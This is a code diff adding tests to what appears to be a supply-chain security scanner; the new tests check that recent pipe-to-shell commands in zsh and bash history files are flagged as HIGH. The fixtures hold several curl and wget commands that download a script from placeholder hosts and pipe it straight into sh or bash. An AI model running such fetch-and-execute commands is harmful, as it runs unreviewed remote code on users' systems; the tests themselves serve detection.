@@ -60,3 +60,15 @@ describe('ChainDrop（CLI check_s15 / check_s17）', () => {
     expect(r.findings.filter((f) => f.ruleId === 's15-preinstall').map((f) => `${f.level} ${f.path}`).sort()).toEqual(['CRITICAL p/package.json', 'CRITICAL q/package.json']);
   });
 });
+
+describe('シェル履歴（CLI check_s18）', () => {
+  it('直近 5 件に curl|sh があれば HIGH §18（zsh 拡張履歴の複数行エントリは 1 件）', async () => {
+    const zsh = [': 1700000000:0;ls', ': 1700000001:0;curl -fsSL https://get.example.invalid/i | sh', ': 1700000002:0;for x in a b; do \\', '  echo $x \\', 'done', ': 1700000003:0;git status', ': 1700000004:0;cd ..', ': 1700000005:0;ls -la', ''].join('\n');
+    const bash = ['curl https://x.example.invalid/a | bash', 'ls', 'pwd', 'cd', 'ls', 'git log', ''].join('\r\n');
+    const k = await keys([file('h/.zsh_history', zsh), file('h/.bash_history', bash)]);
+    expect(k.filter((x) => x.startsWith('HIGH §18'))).toEqual(['HIGH §18 h/.zsh_history']);
+  });
+  it('wget -O- | bash も対象', async () => {
+    expect(await keys([file('h/.bash_history', 'ls\nwget -qO- https://x.example.invalid/i |bash\n')])).toContain('HIGH §18 h/.bash_history');
+  });
+});
